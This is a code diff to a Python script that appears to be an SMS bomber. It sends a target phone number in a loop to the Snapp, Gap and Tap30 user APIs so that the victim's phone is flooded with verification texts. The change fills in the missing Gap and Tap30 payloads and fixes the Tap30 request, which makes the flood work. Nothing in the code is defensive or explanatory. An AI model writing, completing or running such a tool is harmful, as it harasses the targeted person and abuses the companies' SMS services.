@@ -13,8 +13,8 @@ tap30_api_url= 'https://api.tapsi.cab/api/v2.2/user'
 
 # Payloads for the APIs
 snapp_payload = {'cellphone': target_phone_number}
-gap_payload = {}
-tap30_payload = {}
+gap_payload = {'cellphone': target_phone_number}
+tap30_payload = {'cellphone': target_phone_number}
 
 # Headers for the APIs
 headers = {'Content-Type': 'application/json'}
@@ -31,5 +31,5 @@ for i in range(number_of_sms_to_send):
 
 # Send SMS using Tap30 API
 for i in range(number_of_sms_to_send):
-    response = requests.post(tap30_api_url.format(target_phone_number), headers=headers, json=gap_payload)
+    response = requests.post(tap30_api_url.format(target_phone_number), headers=headers, json=tap30_payload)
     print(f'GAP SMS {i+1} sent with response code {response.status_code}')
